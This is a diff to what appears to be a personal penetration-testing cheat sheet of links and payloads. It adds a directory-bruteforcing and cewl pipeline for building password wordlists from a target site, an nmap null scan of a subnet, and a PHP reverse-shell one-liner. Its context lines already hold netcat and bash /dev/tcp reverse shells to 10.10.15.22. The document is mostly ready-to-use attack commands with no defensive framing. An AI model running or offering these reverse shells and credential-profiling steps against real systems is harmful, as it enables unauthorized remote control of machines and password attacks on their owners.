@@ -56,6 +56,20 @@ A collection of links and payloads I stored for quick access
 - [**OllyDBG**](https://www.ollydbg.de/)
 - [**checksec**](https://github.com/slimm609/checksec.sh)
 # Payloads
+## Profiling Password Lists
+### CEWL
+```ULTIMATE WAY OF CREATING A WORDLIST
+1.DIRECTORY BRUTEFORCING
+feroxbuster -eknr --wordlist $HOME/tools/crimson/words/dir -u https://<target_domain>/ -o ferox.txt
+2. PREPARE FIRST PART OF THE cewl.txt
+cat ferox.txt | grep 200 | grep -v "png\|\.js" | cut -d "h" -f2-100 | sed "s/^/h/g" >> urls.txt
+for url in $(cat urls.txt); do echo $url && cewl -d 5 $url >> temp_cewl.txt;done
+cat temp_cewl.txt | sort -u >> cewl.txt && rm temp_cewl.txt
+3. GO TO BURP AND SELECT ALL 200 NON STATIC SITES
+```
+## Nmap
+### Null Scan 
+```nmap  -n -sN 10.10.110.0/24```
 ## Local Webserver
 
 ### Python
@@ -85,7 +99,8 @@ nc -lnvp 4000
 ```bash
 nc -e /bin/sh 10.10.15.22 4000
 ```
-
+#### PHP:
+```<?php $sock = fsockopen("ip","port");$proc = proc_open("bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>```
 #### Bash
 ```bash
 bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
